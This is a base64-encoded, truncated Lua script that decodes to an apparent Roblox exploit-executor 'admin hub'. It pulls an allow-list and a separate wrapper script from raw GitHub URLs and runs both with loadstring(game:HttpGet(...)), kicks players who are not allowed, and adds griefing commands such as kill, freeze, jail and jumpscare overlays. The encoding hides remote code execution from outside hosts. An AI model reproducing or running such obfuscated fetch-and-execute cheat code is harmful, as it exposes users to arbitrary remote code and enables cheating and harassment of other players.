NhdGVkU3RvcmFnZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQpsb2NhbCBUd2VlblNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpCmxvY2FsIENvcmVHdWkgPSBnYW1lOkdldFNlcnZpY2UoIkNvcmVHdWkiKQpsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgV29ya3NwYWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKQpsb2NhbCBIdHRwU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKQoKZ2V0Z2VudigpLlNjcmlwdElEID0gIkFVUkFMWU5YSFVCQURNIgoKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIHBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgZnVuY3Rpb24gaXNIdWJVc2VyKHBscikKICAgIHJldHVybiBwbHI6RmluZEZpcnN0Q2hpbGQoIkF1cmFseW54SHViX0ZsYWciKSB+PSBuaWwKZW5kCgpsb2NhbCBwZXJtaXNzaW9uVVJMID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9seW54eGRldi9mcmVlbWFuLXNjcmlwdHNzL21haW4vQXVyYWx5bnhzLmx1YSIKbG9jYWwgYWxsb3dlZFVzZXJzID0ge30KCmxvY2FsIGx5bnhTdWNjZXNzLCBseW54UmVzdWx0ID0gcGNhbGwoZnVuY3Rpb24oKQogICAgcmV0dXJuIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KHBlcm1pc3Npb25VUkwpKSgpCmVuZCkKCmlmIGx5bnhTdWNjZXNzIGFuZCB0eXBlKGx5bnhSZXN1bHQpID09ICJ0YWJsZSIgdGhlbgogICAgYWxsb3dlZFVzZXJzID0gbHlueFJlc3VsdAplbmQKCmxvY2FsIGlzQXV0aG9yaXplZCA9IGFsbG93ZWRVc2Vyc1tMb2NhbFBsYXllci5OYW1lXSA9PSB0cnVlCgppZiBub3QgaXNBdXRob3JpemVkIHRoZW4KICAgIExvY2FsUGxheWVyOktpY2soIkRlbmllZC4iKQogICAgcmV0dXJuCmVuZAoKcGNhbGwoZnVuY3Rpb24oKQogICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9seW54NzgyL2x5bnh3cmFwcGVycy9tYWluL2F1cmFseW54d3JhcHBlci5sdWEiKSkoKQplbmQpCgoKbG9jYWwgRlJPWkVOX1BMQVlFUlMgPSB7fQpsb2NhbCBwbGF5ZXJPcmlnaW5hbFNwZWVkID0ge30KbG9jYWwgamF1bGFzID0ge30KbG9jYWwgamFpbENvbm5lY3Rpb25zID0ge30KbG9jYWwgSlVNUFNDQVJFUyA9IHsKICAgIHsgTmFtZSA9ICI7anVtcHMxIiwgSW1hZ2VJZCA9ICJyYnhhc3NldGlkOi8vMjIwNTEwMDc3IiwgQXVkaW9JZCA9ICJyYnhhc3NldGlkOi8vNTc2ODcwODE4OCIgfSwKICAgIHsgTmFtZSA9ICI7anVtcHMyIiwgSW1hZ2VJZCA9ICJyYnhhc3NldGlkOi8vMTY1NjI4NzUxNTQiLCBBdWRpb0lkID0gInJieGFzc2V0aWQ6Ly82MzExNDE2NDg1IiB9LAogICAgeyBOYW1lID0gIjtqdW1wczMiLCBJbWFnZUlkID0gInJieGFzc2V0aWQ6Ly8xMjI5MzUxMDA0NiIsIEF1ZGlvSWQgPSAicmJ4YXNzZXRpZDovLzE4NDU5NTIxMDAyIiB9LAogICAgeyBOYW1lID0gIjtqdW1wczQiLCBJbWFnZUlkID0gInJieGFzc2V0aWQ6Ly8xMjU5MjczMDE2NjgzMTEiLCBBdWRpb0lkID0gInJieGFzc2V0aWQ6Ly85NDcxNjA3NjgwMzQwMCIgfSwKfQoKbG9jYWwgZnVuY3Rpb24gRnJlZXplUGxheWVyKHBsYXllcikKICAgIGlmIG5vdCBwbGF5ZXIgb3Igbm90IHBsYXllci5DaGFyYWN0ZXIgdGhlbiByZXR1cm4gZmFsc2UgZW5kCgogICAgbG9jYWwgaHVtYW5vaWQgPSBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgaWYgbm90IGh1bWFub2lkIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAoKICAgIGlmIEZST1pFTl9QTEFZRVJTW3BsYXllci5OYW1lXSB0aGVuIHJldHVybiBmYWxzZSBlbmQKICAgIAogICAgRlJPWkVOX1BMQVlFUlNbcGxheWVyLk5hbWVdID0gewogICAgICAgIFdhbGtTcGVlZCA9IGh1bWFub2lkLldhbGtTcGVlZCwKICAgICAgICBKdW1wUG93ZXIgPSBodW1hbm9pZC5KdW1wUG93ZXIKICAgIH0KICAgIGh1bWFub2lkLldhbGtTcGVlZCA9IDAKICAgIGh1bWFub2lkLkp1bXBQb3dlciA9IDAKCiAgICByZXR1cm4gdHJ1ZQplbmQKCmxvY2FsIGZ1bmN0aW9uIFVuZnJlZXplUGxheWVyKHBsYXllcikKICAgIGlmIG5vdCBwbGF5ZXIgb3Igbm90IEZST1pFTl9QTEFZRVJTW3BsYXllci5OYW1lXSB0aGVuIHJldHVybiBmYWxzZSBlbmQKICAgIAogICAgbG9jYWwgc2F2ZWQgPSBGUk9aRU5fUExBWUVSU1twbGF5ZXIuTmFtZV0KCiAgICBpZiBwbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICBsb2NhbCBodW1hbm9pZCA9IHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgaWYgaHVtYW5vaWQgdGhlbgogICAgICAgICAgICBodW1hbm9pZC5XYWxrU3BlZWQgPSBzYXZlZC5XYWxrU3BlZWQKICAgICAgICAgICAgaHVtYW5vaWQuSnVtcFBvd2VyID0gc2F2ZWQuSnVtcFBvd2VyCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBGUk9aRU5fUExBWUVSU1twbGF5ZXIuTmFtZV0gPSBuaWwKICAgIHJldHVybiB0cnVlCmVuZAoKbG9jYWwgZnVuY3Rpb24gS2lsbFBsdXMocGxheWVyKQogICAgaWYgbm90IHBsYXllciBvciBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICBpZiBub3QgcGxheWVyLkNoYXJhY3RlciB0aGVuIHJldHVybiBmYWxzZSBlbmQKCiAgICBsb2NhbCBodW1hbm9pZCA9IHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICBsb2NhbCBocnAgPSBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGlmIG5vdCBodW1hbm9pZCBvciBub3QgaHJwIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAoKICAgIGxvY2FsIHRhcmdldFBvcyA9IGhycC5Qb3NpdGlvbgogICAgbG9jYWwgcGFydHMgPSB7fQogICAgbG9jYWwgbnVtUGFydHMgPSA4CgogICAgZm9yIGkgPSAxLCBudW1QYXJ0cyBkbwogICAgICAgIGxvY2FsIHBhcnQgPSBJbnN0YW5jZS5uZXcoIlBhcnQiKQogICAgICAgIHBhcnQuTmFtZSA9ICJLaWxsUGx1c1BhcnRfIiAuLiBpCiAgICAgICAgcGFydC5TaXplID0gVmVjdG9yMy5uZXcoMywgMywgMykKICAgICAgICBwYXJ0LlBvc2l0aW9uID0gdGFyZ2V0UG9zICsgVmVjdG9yMy5uZXcobWF0aC5yYW5kb20oLTE1LCAxNSksIC0xMCwgbWF0aC5yYW5kb20oLTE1LCAxNSkpCiAgICAgICAgcGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgcGFydC5DYW5Db2xsaWRlID0gdHJ1ZQogICAgICAgIHBhcnQuTWF0ZXJpYWwgPSBFbnVtLk1hdGVyaWFsLk5lb24KICAgICAgICBwYXJ0LkJyaWNrQ29sb3IgPSBCcmlja0NvbG9yLm5ldygiUmVhbGx5IHJlZCIpCiAgICAgICAgcGFydC5QYXJlbnQgPSB3b3Jrc3BhY2UKCiAgICAgICAgbG9jYWwgYnYgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIpCiAgICAgICAgYnYuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLCAxMDAsIDApCiAgICAgICAgYnYuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyg0MDAwLCA0MDAwLCA0MDAwKQogICAgICAgIGJ2LlBhcmVudCA9IHBhcnQKCiAgICAgICAgdGFibGUuaW5zZXJ0KHBhcnRzLCBwYXJ0KQogICAgZW5kCgogICAgdGFzay53YWl0KDEuNSkKCiAgICBpZiBwbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICBwbGF5ZXIuQ2hhcmFjdGVyOkJyZWFrSm9pbnRzKCkKCiAgICAgICAgbG9jYWwgZXhwbG9zaW9uID0gSW5zdGFuY2UubmV3KCJQYXJ0IikKICAgICAgICBleHBsb3Npb24uU2l6ZSA9IFZlY3RvcjMubmV3KDEwLCAxMCwgMTApCiAgICAgICAgZXhwbG9zaW9uLlBvc2l0aW9uID0gdGFyZ2V0UG9zCiAgICAgICAgZXhwbG9zaW9uLkFuY2hvcmVkID0gdHJ1ZQogICAgICAgIGV4cGxvc2lvbi5DYW5Db2xsaWRlID0gZmFsc2UKICAgICAgICBleHBsb3Npb24uTWF0ZXJpYWwgPSBFbnVtLk1hdGVyaWFsLk5lb24KICAgICAgICBleHBsb3Npb24uQnJpY2tDb2xvciA9IEJyaWNrQ29sb3IubmV3KCJCcmlnaHQgeWVsbG93IikKICAgICAgICBleHBsb3Npb24uVHJhbnNwYXJlbmN5ID0gMC4zCiAgICAgICAgZXhwbG9zaW9uLlBhcmVudCA9IHdvcmtzcGFjZQoKICAgICAgICBsb2NhbCBsaWdodCA9IEluc3RhbmNlLm5ldygiUG9pbnRMaWdodCIpCiAgICAgICAgbGlnaHQuQnJpZ2h0bmVzcyA9IDEwCiAgICAgICAgbGlnaHQuUmFuZ2UgPSAyMAogICAgICAgIGxpZ2h0LkNvbG9yID0gQ29sb3IzLm5ldygxLCAxLCAwKQogICAgICAgIGxpZ2h0LlBhcmVudCA9IGV4cGxvc2lvbgoKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIkRlYnJpcyIpOkFkZEl0ZW0oZXhwbG9zaW9uLCAzKQoKICAgICAgICBmb3IgXywgcGFydCBpbiBpcGFpcnMocGFydHMpIGRvCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiRGVicmlzIik6QWRkSXRlbShwYXJ0LCA0KQogICAgICAgIGVuZAogICAgZW5kCgogICAgcmV0dXJuIHRydWUKZW5kCgpsb2NhbCBmdW5jdGlvbiBUcmlnZ2VySnVtcHNjYXJlKHBsYXllciwganVtcHNjYXJlKQogICAgaWYgbm90IHBsYXllciBvciBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICBsb2NhbCBzY3JlZW5HdWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIsIENvcmVHdWkpCiAgICBzY3JlZW5HdWkuTmFtZSA9ICJKdW1wc2NhcmVHdWkiCiAgICBzY3JlZW5HdWkuSWdub3JlR3VpSW5zZXQgPSB0cnVlCiAgICBsb2NhbCBpbWFnZUxhYmVsID0gSW5zdGFuY2UubmV3KCJJbWFnZUxhYmVsIiwgc2NyZWVuR3VpKQogICAgaW1hZ2VMYWJlbC5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCiAgICBpbWFnZUxhYmVsLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApCiAgICBpbWFnZUxhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBpbWFnZUxhYmVsLkltYWdlID0ganVtcHNjYXJlLkltYWdlSWQKICAgIGxvY2FsIHNvdW5kID0gSW5zdGFuY2UubmV3KCJTb3VuZCIsIHNjcmVlbkd1aSkKICAgIHNvdW5kLlNvdW5kSWQgPSBqdW1wc2NhcmUuQXVkaW9JZAogICAgc291bmQuVm9sdW1lID0gMQogICAgc291bmQuTG9vcGVkID0gZmFsc2UKICAgIHNvdW5kOlBsYXkoKQoKICAgIGxvY2FsIFR3ZWVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIikKICAgIGxvY2FsIGZsYXNoQ291bnQgPSAxNQogICAgbG9jYWwgZmxhc2hJbnRlcnZhbCA9IDAuMDgKICAgIGZvciBpID0gMSwgZmxhc2hDb3VudCBkbwogICAgICAgIGlmIG5vdCBzY3JlZW5HdWkuUGFyZW50IHRoZW4gYnJlYWsgZW5kCiAgICAgICAgbG9jYWwgb2Zmc2V0WCA9IG1hdGgucmFuZG9tKC0yNSwyNSkKICAgICAgICBsb2NhbCBvZmZzZXRZID0gbWF0aC5yYW5kb20oLTI1LDI1KQogICAgICAgIGxvY2FsIHR3ZWVuID0gVHdlZW5TZXJ2aWNlOkNyZWF0ZShpbWFnZUxhYmVsLCBUd2VlbkluZm8ubmV3KGZsYXNoSW50ZXJ2YWwsIEVudW0uRWFzaW5nU3R5bGUuTGluZWFyKSwge1Bvc2l0aW9uID0gVURpbTIubmV3KDAsb2Zmc2V0WCwwLG9mZnNldFkpfSkKICAgICAgICB0d2VlbjpQbGF5KCkKICAgICAgICB0YXNrLndhaXQoZmxhc2hJbnRlcnZhbCkKICAgIGVuZAogICAgaW1hZ2VMYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLDAsMCwwKSAtLSBSZXNldC4KICAgIHNvdW5kOlN0b3AoKQogICAgc2NyZWVuR3VpOkRlc3Ryb3koKQogICAgcmV0dXJuIHRydWUKZW5kCgpsb2NhbCBmdW5jdGlvbiBpc0FsbG93ZWQocGxheWVyKQogICAgcmV0dXJuIGFsbG93ZWRVc2Vyc1twbGF5ZXIuTmFtZV0gfj0gbmlsCmVuZAoKbG9jYWwgZnVuY3Rpb24gaXNIdWJVc2VyKHBscikKICAgIHJldHVybiBwbHI6RmluZEZpcnN0Q2hpbGQoIkF1cmFseW54SHViX0ZsYWciKSB+PSBuaWwKZW5kCgpsb2NhbCBmdW5jdGlvbiB3YWl0Rm9ySHViRmxhZyhwbGF5ZXIpCiAgICBpZiBpc0h1YlVzZXIocGxheWVyKSB0aGVuIHJldHVybiB0cnVlIGVuZAogICAgbG9jYWwgZmxhZyA9IHBsYXllcjpXYWl0Rm9yQ2hpbGQoIkF1cmFseW54SHViX0ZsYWciLCA1KQogICAgcmV0dXJuIGZsYWcgfj0gbmlsCmVuZAoKbG9jYWwgZnVuY3Rpb24gY3JlYXRlQmVhdXRpZnVsVGFnKHBsYXllciwgdGFnVGV4dCkKICAgIGxvY2FsIGNoYXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgIGxvY2FsIGhlYWQgPSBjaGFyOldhaXRGb3JDaGlsZCgiSGVhZCIpCgogICAgZm9yIF8sIHYgaW4gaXBhaXJzKGhlYWQ6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB2Lk5hbWUgPT0gIlNwZWNpYWxUYWciIHRoZW4gdjpEZXN0cm95KCkgZW5kCiAgICBlbmQKCiAgICBsb2NhbCB0YWdHdWkgPSBJbnN0YW5jZS5uZXcoIkJpbGxib2FyZEd1aSIpCiAgICB0YWdHdWkuTmFtZSA9ICJTcGVjaWFsVGFnIgogICAgdGFnR3VpLlBhcmVudCA9IGhlYWQKICAgIHRhZ0d1aS5BZG9ybmVlID0gaGVhZAogICAgdGFnR3VpLlNpemUgPSBVRGltMi5uZXcoMCwxOTAsMCw1MCkKICAgIHRhZ0d1aS5TdHVkc09mZnNldCA9IFZlY3RvcjMubmV3KDAsMiwwKQogICAgdGFnR3VpLkFsd2F5c09uVG9wID0gdHJ1ZQoKICAgIGxvY2FsIGZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIHRhZ0d1aSkKICAgIGZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwwLDEsMCkKICAgIGZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjUKICAgIGZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig0MCwwLDkwKQogICAgbG9jYWwgY29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIGZyYW1lKQogICAgY29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsMTYpCgogICAgbG9jYWwgc3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIsIGZyYW1lKQogICAgc3Ryb2tlLlRoaWNrbmVzcyA9IDIKICAgIHN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDE0NSwwLDI1NSkKICAgIHN0cm9rZS5UcmFuc3BhcmVuY3kgPSAwLjE1CgogICAgbG9jYWwgZ3JhZCA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIGZyYW1lKQogICAgZ3JhZC5Sb3RhdGlvbiA9IDAKICAgIGdyYWQuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ld3sKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAsIENvbG9yMy5mcm9tUkdCKDE1MCwwLDI1NSkpLAogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4zLCBDb2xvcjMuZnJvbVJHQigxMjAsMCwxODApKSwKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuNywgQ29sb3IzLmZyb21SR0IoNjAsMCwxMjApKSwKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDI1NSwyNTUsMjU1KSkKICAgIH0KCiAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgdDAgPSB0aWNrKCkKICAgICAgICB3aGlsZSBncmFkLlBhcmVudCBkbwogICAgICAgICAgICBncmFkLk9mZnNldCA9IFZlY3RvcjIubmV3KDAuNSswLjUqbWF0aC5zaW4oKHRpY2soKS10MCkqMiksMCkKICAgICAgICAgICAgdGFzay53YWl0KDAuMDIpCiAgICAgICAgZW5kCiAgICBlbmQpCgogICAgbG9jYWwgdGFnTGJsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBmcmFtZSkKICAgIHRhZ0xibC5TaXplID0gVURpbTIubmV3KDEsLTEyLDEsLTEyKQogICAgdGFnTGJsLlBvc2l0aW9uID0gVURpbTIubmV3KDAsNiwwLDYpCiAgICB0YWdMYmwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIHRhZ0xibC5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgIHRhZ0xibC5UZXh0ID0gdGFnVGV4dAogICAgdGFnTGJsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsMjU1LDI1NSkKICAgIHRhZ0xibC5UZXh0U2l6ZSA9IDE5CiAgICB0YWdMYmwuVGV4dFN0cm9rZUNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDgwLDAsMTIwKQogICAgdGFnTGJsLlRleHRTdHJva2VUcmFuc3BhcmVuY3kgPSAwLjY2CiAgICB0YWdMYmwuVGV4dFNjYWxlZCA9IHRydWUKCiAgICBsb2NhbCBncmFkTGJsID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IiwgdGFnTGJsKQogICAgZ3JhZExibC5Db2xvciA9IENvbG9yU2VxdWVuY2UubmV3ewogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMCwgQ29sb3IzLmZyb21SR0IoMTUwLDAsMjU1KSksCiAgICAgICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjM1LCBDb2xvcjMuZnJvbVJHQigxMjAsMCwxODApKSwKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuNywgQ29sb3IzLmZyb21SR0IoMjU1LDI1NSwyNTUpKSwKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDE5MCwwLDI1NSkpCiAgICB9CgogICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHQwID0gdGljaygpCiAgICAgICAgd2hpbGUgZ3JhZExibC5QYXJlbnQgZG8KICAgICAgICAgICAgZ3JhZExibC5PZmZzZXQgPSBWZWN0b3IyLm5ldygwLjUrMC41Km1hdGguc2luKCh0aWNrKCktdDApKjIuMiksMCkKICAgICAgICAgICAgdGFzay53YWl0KDAuMDIpCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZAoKbG9jYWwgZnVuY3Rpb24gYXBwbHlUYWcocGxheWVyKQogICAgaWYgbm90IGlzQWxsb3dlZChwbGF5ZXIpIGFuZCBub3Qgd2FpdEZvckh1YkZsYWcocGxheWVyKSB0aGVuIHJldHVybiBlbmQKCiAgICBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgY3JlYXRlQmVhdXRpZnVsVGFnKHBsYXllciwgIuKmviBVc2VyIOKmviIpCiAgICBlbmQpCgogICAgaWYgcGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgY3JlYXRlQmVhdXRpZnVsVGFnKHBsYXllciwgIuKmviBVc2VyIOKmviIpCiAgICBlbmQKZW5kCgpmb3IgXywgcCBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICBhcHBseVRhZyhwKQplbmQKClBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChhcHBseVRhZykKCmxvY2FsIGZ1bmN0aW9uIFByb2Nlc3NhckNvbWFuZG8obWVuc2FnZW0pCiAgICBpZiBzdHJpbmcuc3ViKG1lbnNhZ2VtLCAxLCAxKSA9PSAiOyIgdGhlbgogICAgICAgIGxvY2FsIHBhcnRlcyA9IHN0cmluZy5zcGxpdChzdHJpbmcuc3ViKG1lbnNhZ2VtLCAyKSwgIiAiKQogICAgICAgIGxvY2FsIGNvbWFuZG8gPSBwYXJ0ZXNbMV06bG93ZXIoKQogICAgICAgIGxvY2FsIG5vbWVBbHZvID0gdGFibGUuY29uY2F0KHBhcnRlcywgIiAiLCAyKQogICAgICAgIGxvY2FsIHRhcmdldFBsYXllciA9IG5pbAogICAgICAgIGZvciBfLHBsciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgIGlmIHBsci5OYW1lID09IG5vbWVBbHZvIG9yIHBsci5EaXNwbGF5TmFtZSA9PSBub21lQWx2byB0aGVuCiAgICAgICAgICAgICAgICB0YXJnZXRQbGF5ZXIgPSBwbHIKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIGlmIG5vdCB0YXJnZXRQbGF5ZXIgdGhlbgogICAgICAgICAgICB0YXJnZXRQbGF5ZXIgPSBMb2NhbFBsYXllcgogICAgICAgIGVuZAogICAgICAgIGlmIHRhcmdldFBsYXllciA9PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgICAgIGxvY2FsIHBsYXllck5hbWUgPSBMb2NhbFBsYXllci5OYW1lCiAgICAgICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBsb2NhbCBodW1hbm9pZCA9IGNoYXJhY3RlciBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICBpZiBjb21hbmRvID09ICJraWxscGx1cyIgdGhlbgogICAgS2lsbFBsdXMoTG9jYWxQbGF5ZXIpCiAgICByZXR1cm4KCmVsc2VpZiBjb21hbmRvID09ICJmcmVlemUiIHRoZW4KICAgIGlmIGh1bWFub2lkIHRoZW4KICAgICAgICBwbGF5ZXJPcmlnaW5hbFNwZWVkW3BsYXllck5hbWVdID0gaHVtYW5vaWQuV2Fsa1NwZWVkCiAgICAgICAgaHVtYW5vaWQuV2Fsa1NwZWVkID0gMAogICAgZW5kCiAgICByZXR1cm4KCmVsc2VpZiBjb21hbmRvID09ICJ1bmZyZWV6ZSIgdGhlbgogICAgaWYgaHVtYW5vaWQgdGhlbgogICAgICAgIGh1bWFub2lkLldhbGtTcGVlZCA9IHBsYXllck9yaWdpbmFsU3BlZWRbcGxheWVyTmFtZV0gb3IgMTYKICAgICAgICBwbGF5ZXJPcmlnaW5hbFNwZWVkW3BsYXllck5hbWVdID0gbmlsCiAgICBlbmQKICAgIHJldHVybgoKZWxzZWlmIGNvbWFuZG8gPT0gImphaWwiIHRoZW4KICAgIGlmIGNoYXJhY3RlciB0aGVuCiAgICAgICAgbG9jYWwgcm9vdCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCgogICAgICAgIGlmIHJvb3QgYW5kIGh1bWFub2lkIHRoZW4KCiAgICAgICAgICAgIC0tIHNhbHZhIGEgdmVsb2NpZGFkZSBkbyBwbGF5ZXIKICAgICAgICAgICAgcGxheWVyT3JpZ2luYWxTcGVlZFtwbGF5ZXJOYW1lXSA9IGh1bWFub2lkLldhbGtTcGVlZAogICAgICAgICAgICBodW1hbm9pZC5XYWxrU3BlZWQgPSAwCgogICAgICAgICAgICBsb2NhbCBzaXplID0gMTIKICAgICAgICAgICAgbG9jYWwgcG9zID0gcm9vdC5Qb3NpdGlvbgoKICAgICAgICAgICAgamF1bGFzW3BsYXllck5hbWVdID0ge30KCiAgICAgICAgICAgIC0tIGNyaWEgYXMgYmFycmFzIHZpc3VhbG1lbnRlCiAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIGNyaWFyQmFycmEoY2ZyYW1lLCBzaXplLCBjb2xvcikKICAgICAgICAgICAgICAgIGxvY2FsIHAgPSBJbnN0YW5jZS5uZXcoIlBhcnQiKQogICAgICAgICAgICAgICAgcC5OYW1lID0gIkx5bnhKYWlsQmFyIgogICAgICAgICAgICAgICAgcC5TaXplID0gc2l6ZQogICAgICAgICAgICAgICAgcC5BbmNob3JlZCA9IHRydWUKICAgICAgICAgICAgICAgIHAuQ2FuQ29sbGlkZSA9IHRydWUKICAgICAgICAgICAgICAgIHAuTWF0ZXJpYWwgPSBFbnVtLk1hdGVyaWFsLk5lb24KICAgICAgICAgICAgICAgIHAuQnJpY2tDb2xvciA9IGNvbG9yCiAgICAgICAgICAgICAgICBwLlJlZmxlY3RhbmNlID0gMC4yCiAgICAgICAgICAgICAgICBwLkNGcmFtZSA9IGNmcmFtZQogICAgICAgICAgICAgICAgcC5QYXJlbnQgPSBXb3Jrc3BhY2UKCiAgICAgICAgICAgICAgICBsb2NhbCBwb2ludExpZ2h0ID0gSW5zdGFuY2UubmV3KCJQb2ludExpZ2h0IikKICAgICAgICAgICAgICAgIHBvaW50TGlnaHQuQnJpZ2h0bmVzcyA9IDMKICAgICAgICAgICAgICAgIHBvaW50TGlnaHQuUmFuZ2UgPSA4CiAgICAgICAgICAgICAgICBwb2ludExpZ2h0LkNvbG9yID0gQ29sb3IzLm5ldygxLDEsMSkKICAgICAgICAgICAgICAgIHBvaW50TGlnaHQuUGFyZW50ID0gcAoKICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChqYXVsYXNbcGxheWVyTmFtZV0sIHApCiAgICAgICAgICAgICAgICByZXR1cm4gcAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIC0tIHBhcmVkZXMKICAgICAgICAgICAgY3JpYXJCYXJyYShDRnJhbWUubmV3KHBvcyArIFZlY3RvcjMubmV3KHNpemUvMiwgMCwgc2l6ZS8yKSksIFZlY3RvcjMubmV3KDAuOCwgc2l6ZSwgMC44KSwgQnJpY2tDb2xvci5uZXcoIlJlYWxseSBibGFjayIpKQogICAgICAgICAgICBjcmlhckJhcnJhKENGcmFtZS5uZXcocG9zICsgVmVjdG9yMy5uZXcoLXNpemUvMiwgMCwgc2l6ZS8yKSksIFZlY3RvcjMubmV3KDAuOCwgc2l6ZSwgMC44KSwgQnJpY2tDb2xvci5uZXcoIlJlYWxseSBibGFjayIpKQogICAgICAgICAgICBjcmlhckJhcnJhKENGcmFtZS5uZXcocG9zICsgVmVjdG9yMy5uZXcoc2l6ZS8yLCAwLCA